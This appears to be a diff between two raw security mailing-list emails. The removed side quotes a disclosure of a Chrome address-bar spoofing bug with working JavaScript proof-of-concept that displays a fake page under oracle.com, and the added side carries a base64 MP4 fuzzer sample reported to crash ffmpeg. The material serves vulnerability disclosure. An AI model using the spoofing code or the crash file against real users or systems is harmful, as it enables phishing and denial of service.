@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["3052" "Thursday" "2" "July" "2015" "19:17:20" "-0400" "Daniel Wood" "daniel.wood@owasp.org" "<14FBDFC5-67A0-4C57-9DC7-DC71E313A0A0@owasp.org>" "86" "[oss-security] Re: [FD] Google Chrome Address Spoofing (Request For Comment)" nil nil nil "7" "2015070223:17:20" "[oss-security] Re: [FD] Google Chrome Address Spoofing (Request For Comment)" (number mark "        daniel.wood@ Jul  2   86/3052  " thread-indent "\"[oss-security] Re: [FD] Google Chrome Address Spoofing (Request For Comment)\"\n") "<20150702171848.395E573EA@hb.insecure.org>" ("<20150702171848.395E573EA@hb.insecure.org>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2702" "Monday" "26" "September" "2016" "03:03:16" "+0200" "cookieopfer@gmx.net" "cookieopfer@gmx.net" "<trinity-b4ba7486-1df9-44b1-927e-feeb38f0466e-1474851796223@3capp-gmx-bs55>" "64" "Re: Re: [oss-security] ffmpeg afl bugs" "^Date:" nil nil "9" "2016092601:03:16" "[oss-security] ffmpeg afl bugs" (number mark "        cookieopfer@ Sep 26   64/2702  " thread-indent "\"Re: Re: [oss-security] ffmpeg afl bugs\"\n") "<CALx_OUDn=wBw4XdZw6YJdRTHQigpHqYHoED6JUNEx9LppY0ERA@mail.gmail.com>" ("<trinity-791b10d9-ee4c-4418-ab3c-338e17152b44-1474834018724@3capp-gmx-bs68>" "<20160925233516.GA10278@openwall.com>" "<CALx_OUDn=wBw4XdZw6YJdRTHQigpHqYHoED6JUNEx9LppY0ERA@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 17822 invoked by uid 550); 2 Jul 2015 23:45:17 -0000
+Received: (qmail 5603 invoked by uid 550); 26 Sep 2016 01:56:02 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,123 +11,100 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 28422 invoked from network); 2 Jul 2015 23:17:29 -0000
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20130820;
-        h=x-gm-message-state:content-type:mime-version:subject:from
-         :in-reply-to:date:cc:content-transfer-encoding:message-id:references
-         :to;
-        bh=qV+qqskvw5CJqyNEq7moY+FI8xnGe6qx+hfhaUc0ugU=;
-        b=beQVInWs5i+vjIkuSDPCJoaDOQL3gLGeNPlfY4toID9fUCern76NsIrr3tTux3XxO6
-         lXWGTAxcztWG25QsYtbfwfpzEvSSKcVnw+FEGLLVfT/7Ip/TN9IrTBLvsJMoKSoaMvrU
-         hdvTkeLr58AyRjLF1eNUidIHBPzg30ftryiWxD4QehDhKHSM4qBrYf0N4lu8X7RVFTik
-         zTz6Bd68y/Bx5VNN1aE9NhEzauNgUxM9GK4bf5pqYIyCT1zpDXrD7NZtx4FuB3yr/wvu
-         F0VI2kEsC6hSSzJuQ6IvWO2Lu9lOkkjNILfvdDGMeyo8sl9ZXSkF/g3KChHnY87yF/NX
-         B89g==
-X-Gm-Message-State: ALoCoQmD+HNpvt4lNlYdRj1pmPdBg5NJc1eLLrHk1s7ue5S7JqloubmfRcEXP7YNnjEN/rza4vx2
-X-Received: by 10.55.18.158 with SMTP id 30mr68106216qks.17.1435879038023;
-        Thu, 02 Jul 2015 16:17:18 -0700 (PDT)
-Content-Type: text/plain;
-	charset=us-ascii
-Mime-Version: 1.0 (1.0)
-X-Mailer: iPad Mail (12F69)
-In-Reply-To: <20150702171848.395E573EA@hb.insecure.org>
-Content-Transfer-Encoding: quoted-printable
-Message-Id: <14FBDFC5-67A0-4C57-9DC7-DC71E313A0A0@owasp.org>
-References: <20150702171848.395E573EA@hb.insecure.org>
-Cc: David Leo <david.leo@deusen.co.uk>,
- "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>,
- "bugtraq@securityfocus.com" <bugtraq@securityfocus.com>,
- "fulldisclosure@seclists.org" <fulldisclosure@seclists.org>
-Date: Thu, 2 Jul 2015 19:17:20 -0400
-From: Daniel Wood <daniel.wood@owasp.org>
+Received: (qmail 13507 invoked from network); 26 Sep 2016 01:03:27 -0000
+MIME-Version: 1.0
+Message-ID: <trinity-b4ba7486-1df9-44b1-927e-feeb38f0466e-1474851796223@3capp-gmx-bs55>
+Content-Type: multipart/mixed;
+ boundary=knika-8bdb15ca-fdca-400b-b1a4-1aa8e03d4c10
+Importance: normal
+Sensitivity: Normal
+In-Reply-To: <CALx_OUDn=wBw4XdZw6YJdRTHQigpHqYHoED6JUNEx9LppY0ERA@mail.gmail.com>
+References: <trinity-791b10d9-ee4c-4418-ab3c-338e17152b44-1474834018724@3capp-gmx-bs68>
+ <20160925233516.GA10278@openwall.com>,
+ <CALx_OUDn=wBw4XdZw6YJdRTHQigpHqYHoED6JUNEx9LppY0ERA@mail.gmail.com>
+X-UI-Message-Type: mail
+X-Priority: 3
+X-Provags-ID: V03:K0:G4ZL027HTfEH8FjGbdL89huzZC9Q9v8nBHiG8XlAo95
+ cC0k0R6ru26PW47TAotQUW/FT96Vy1svNuIETn8B4cybdWSmux
+ KnLuRV7oUipaMnHAVZsHqtgIb3r0E+J6diFUDnJihBJNbUz2Kc
+ 5yinAk4FkUYa3K+PRk2JEYlcmYIRuyf76f4zJXuYp/SWOMoAQL
+ 0yu3a0Y2KIpEcAbBwQZZoj0V66bfP8YbuGQmBTjkPkeSIkRYDC
+ Ac7/SkbqJ2Tj7oP2D39DtCy7nheorn1RYpBng1ApFvI+UxwHzN nhXDMc=
+X-UI-Out-Filterresults: notjunk:1;V01:K0:SLZe4vB2/1s=:OLKbJxApUkfsNRyqzaOUJu
+ 0ybqsReRPvZl/oBl9vtSipEzu8Ggh101WkCbKYWU1H+x+CQmbDTEf32ix+9+XdiRDlJYmSSY9
+ oLXGvMxIZQIXnvuUwCh9pF59MPKflwYVOQxZp8axWlE5Tx0VkVVfSqxzW0Y5cS/VTygnoFLAJ
+ YAH+JbpX/LBesJU5fgb2iMlJFuk0MyhzomB9AW44D1Tuiwuv9qSFGIuvEpfgIc0nB1wZ3frkc
+ yVfE2xZIYxmOjpktK+BoXw8zktcZq8Y8nh9/eUCDnFExlSCrym382UTpep7jtsylbaHpLWpPT
+ IxNcxDcEu8Z8pVpodI/QS/3SjcV3Es3ebVAyZ2GBg1L4Kz+OY795tBVIWbOEmzcY8ElSwD0N0
+ F4/cXIYRLjC/PVRHQqrwmf60BP2VhVyLwnGq7hPW0WTD81manlq12lvjdpXXzbMhqHcXdI4eN
+ 0DbTyqVCJw==
+Date: Mon, 26 Sep 2016 03:03:16 +0200
+From: cookieopfer@gmx.net
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] Re: [FD] Google Chrome Address Spoofing (Request For Comment)
-To: Mustafa Al-Bassam <mus@musalbas.com>
+Subject: Re: Re: [oss-security] ffmpeg afl bugs
+To: oss-security@lists.openwall.com
 
-Yes this is a pretty good find. I can also confirm it works on iOS 8.3 (12F=
-69) with Safari.
+--knika-8bdb15ca-fdca-400b-b1a4-1aa8e03d4c10
+Content-Type: text/plain; charset=UTF-8
 
-DW
-Sent from my iPad
 
-> On Jul 2, 2015, at 9:33 AM, Mustafa Al-Bassam <mus@musalbas.com> wrote:
->=20
-> That's pretty neat. Played around with this and made a few discoveries.
->=20
-> 1. It shows a valid certificate when you spoof HTTPS sites. That's really=
- bad. POC/screenshot: https://github.com/musalbas/address-spoofing-poc
->=20
-> 2. The page isn't responsive when using this flaw. That means you can't s=
-poof a login box for example. (I tried.)
->=20
-> 3. The success of the exploit seems to depend on if the browser can start=
- loading content.html fast enough. I noticed that the exploit works 100% of=
- the time when used locally. Perhaps a better version of the exploit would =
-somehow preload content.html - for example by opening a window with an URL =
-that starts with javascript: followed by a script to display the content? T=
-hat, or perhaps reducing the interval time for trying to run next() after t=
-he popup is created.
->=20
-> I wonder if this works on any other browsers?
->=20
-> MustafaOn 30 Jun 2015 7:08 am, David Leo <david.leo@deusen.co.uk> wrote:
->>=20
->> Impact:=20
->> The "click to verify" thing is completely broken...=20
->> Anyone can be "BBB Accredited Business" etc.=20
->> You can make whitehouse.gov display "We love Islamic State" :-)=20
->>=20
->> Note:=20
->> No user interaction on the fake page.=20
->>=20
->> Code:=20
->> ***** index.html=20
->> <script>=20
->> function next()=20
->> {=20
->> w.location.replace('http://www.oracle.com/index.html?'+n);n++;=20
->> setTimeout("next();",15);=20
->> setTimeout("next();",25);=20
->> }=20
->> function f()=20
->> {=20
->> w=3Dwindow.open("content.html","_blank","width=3D500 height=3D500");=20
->> i=3DsetInterval("try{x=3Dw.location.href;}catch(e){clearInterval(i);n=3D=
-0;next();}",5);=20
->> }=20
->> </script>=20
->> <a href=3D"#" onclick=3D"f()">Go</a><br>=20
->> ***** content.html=20
->> <b>This web page is NOT oracle.com</b>=20
->> <script>location=3D"http://www.oracle.com/index.html";</script>=20
->> ***** It's online=20
->> http://www.deusen.co.uk/items/gwhere.6128645971389012/=20
->> (The page says "June/16/2015" - it works as we tested today)=20
->>=20
->> Request For Comment:=20
->> We reported this to Google.=20
->> They reproduced, and say=20
->> It's DoS which doesn't matter.=20
->> We think it's very strange,=20
->> since the browser does not crash(not DoS),=20
->> and the threat is obvious.=20
->> What's your opinion?=20
->>=20
->> Kind Regards,=20
->>=20
->> PS=20
->> We love clever tricks.=20
->> We love this:=20
->> http://dieyu.org/=20
->>=20
->>=20
->> _______________________________________________=20
->> Sent through the Full Disclosure mailing list=20
->> https://nmap.org/mailman/listinfo/fulldisclosure=20
->> Web Archives & RSS: http://seclists.org/fulldisclosure/
->=20
-> _______________________________________________
-> Sent through the Full Disclosure mailing list
-> https://nmap.org/mailman/listinfo/fulldisclosure
-> Web Archives & RSS: http://seclists.org/fulldisclosure/
+
+> Have fun with ffmpeg-h264-call-stack-overflow.mp4
+> > Perhaps you meant to share this file with this community?
+
+yes, I forgot to mention it is in
+/usr/share/doc/afl/vuln_samples/ffmpeg-h264-call-stack-overflow.mp4
+ 
+> Hmm... I think that
+> docs/vuln_samples/ffmpeg-h264-call-stack-overflow.mp4 is just a sample
+> file that comes with AFL (and dates back to December 2014). I doubt it
+> still crashes anything
+
+see above! not crashing, but:
+
+ "overread end of atom 'stsd' by 4294967134 bytes"
+
+> and I'm not sure what the original reporter was trying to say.
+> 
+> /mz
+
+I just can't fix it further on this machine, so I only could post the
+trace.
+
+Also thanks for afl-fuzz!
+--knika-8bdb15ca-fdca-400b-b1a4-1aa8e03d4c10
+Content-Type: video/mp4
+Content-Disposition: attachment;
+ filename=ffmpeg-h264-call-stack-overflow.mp4
+Content-Transfer-Encoding: base64
+
+AAAAGGZ0eXBtcDQyASoAfm1wNDJpc29tAAAACGZyZWUAAAGVbWRhdAAAAHhl
+iIBAAGtv/vfUt8yy8CAitguo96JpS+Cu3Fec17PZ1ufxFoY+O5PyW3SbHheq
+aWGKdNZqLdmyhMPM7OWrA4Eu62fM5//3k9lDJf5H4RxSZa399HdeDKvMlvbt
+47BpXVuT4b4h7dyKSKY/aT4ezkSaUMF5GAIl4ZAAAAACCTAAAAA2QZoCDfIb
+6AZqAICg1t+sIf71TApS7TeWCSOV/5Vf1dOiT4TCTtSlgy+pSb6QOizjx5st
+9r6fAAAAAglQAAAADwGeBAXRBjb/2N4/9NBdwAAAAAIJUAAAAA8BngQJ0QY2
+/9jeP/TQXcAAAAACCTAAAAAOQZoEHV8mCDW3/tqmWREAAAACCVAAAAALQZ4G
+FaYgzt8ADLgAAAACCVAAAAALAZ4IEdkGNv8AEjAAAAACCVAAAAALAZ4IGaZB
+jb8AEjAAAAACCTAAAAAPQZoIKNLRMBBrb/7aplkRAAAAAglQAAAACwGeCiGm
+QY33k9lDAAAAAglQAAAACwGedCWmQY2/ABIwAAAAAQoAAAM+bW9vdgAAAGxt
+dmhkAAAAANCLYQDQi2EAAAACAAABX5AAAQAAAQAAAAAAAAAAAAAAAAEAAAAA
+AAAAAAAAAAAAAAAB7P8AAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAgAAAsp0cmFrAAAAXHRraGQAAAAH0IthANCLYQAAAAAB
+AAAAAAABX5AAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAA
+AAAAAAAAAAAAAABAAAAAADAAAACQAAAAAAJmbWRpYQAAACBtZGhkAAAAANCL
+YQDQi2EAAAAADAAAAAwVxwAAAAAANGhkbHIAAABlAAAAAAAAAAAAAAAAVmlk
+ZW8gTWVkaWEgSGFuZGxlcgAAAAIKbWluZgAAABR2bWhkAAAAAQAAAAAAAAAA
+AAAAJGRpbmYAAAAcZHJlZgAAAAAAAAABAAAADHVybCAAAAABAAABynN0YmwA
+AACic3RzZAAAAAAAAAAB////8AAQADFNAAAAAAAAAQAAAAAAAAAAAAAAAAAA
+AAAAMACQAEgAAAAAAAQAAAAAAAEKQVZDIENvZGluZwAAIAAAAAAAAAAAAAAA
+AAAAAAAAAAAY//8AAAA8YXZjQwFkQBT/4QAkZ2QAFKwspDE7AVIMDAyAAAAD
+AIAAAAxwQAfQAyH4xwdoSJZYAQAFaOtzUlAAAAAYc3R0cwAAAAAAAAABAAAA
+DAAAAAEAAABgY3R0cwAAAAAAAAAKAAAAAQAAAAEAAAABAAAAAwAAAAIAAAAA
+AAAAAQAAAAQAAAABAAAAAQAAAAH/////AAAAAQAAAAAAAAABAAAAAwAAAAIA
+AAAAAAAAAf////8AAAA0c3RzYwAAAAAAAAADAAAAAQAAAAUAAAABAAAAAgAA
+AAQAAAABAAAAAwAAAAMAAAABAAAARHN0c3oAAAAAAAAAAAAAAAwAAAB8AAAA
+QAAAABkAAAAZAAAAGAAAABUAAAAVAAAAFQAAABkAAAAVAAAAFQAAAAUAAAAc
+c3RjbwAAAAAAAAADAAAAKAAAAS4AAAGGAAAAFHN0c3MAAAAAAAAAAQAAAAE=
+
+--knika-8bdb15ca-fdca-400b-b1a4-1aa8e03d4c10--
